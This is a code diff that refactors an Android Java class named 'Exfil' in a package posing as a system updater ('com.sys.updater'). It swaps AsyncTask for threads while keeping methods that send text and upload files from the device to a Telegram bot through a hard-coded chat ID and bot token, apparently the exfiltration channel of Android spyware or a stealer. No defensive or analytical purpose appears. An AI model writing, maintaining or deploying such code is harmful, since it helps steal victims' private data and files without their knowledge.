@@ -1,6 +1,5 @@
 package com.sys.updater;
 
-import android.os.AsyncTask;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
@@ -14,43 +13,28 @@ public class Exfil {
     public static final String CHAT_ID = "8431994335"; // <--- BEDEL
 
     public static void send(String text) {
-        new SendTextTask().execute(text);
-    }
-    
-    public static void sendFile(String filePath, String type, String caption) {
-        new SendFileTask(filePath, type, caption).execute();
-    }
-
-    private static class SendTextTask extends AsyncTask<String, Void, Void> {
-        @Override
-        protected Void doInBackground(String... params) {
+        new Thread(() -> {
             try {
                 String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                 URL url = new URL(urlStr);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setDoOutput(true);
-                String postData = "chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(params[0], "UTF-8");
+                String postData = "chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");
                 try (OutputStream os = conn.getOutputStream()) {
                     os.write(postData.getBytes());
                 }
                 conn.getInputStream().close();
             } catch (Exception e) { e.printStackTrace(); }
-            return null;
-        }
+        }).start();
     }
-
-    private static class SendFileTask extends AsyncTask<Void, Void, Void> {
-        String path, type, caption;
-        public SendFileTask(String path, String type, String caption) {
-            this.path = path; this.type = type; this.caption = caption;
-        }
-        @Override
-        protected Void doInBackground(Void... params) {
+    
+    public static void sendFile(String filePath, String type, String caption) {
+        new Thread(() -> {
             try {
                 String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/send" + type;
                 String boundary = "*****";
-                File file = new File(path);
+                File file = new File(filePath);
                 HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                 conn.setDoOutput(true);
                 conn.setRequestMethod("POST");
@@ -73,7 +57,6 @@ public class Exfil {
                 dos.flush(); dos.close();
                 conn.getInputStream().close();
             } catch (Exception e) { e.printStackTrace(); }
-            return null;
-        }
+        }).start();
     }
 }
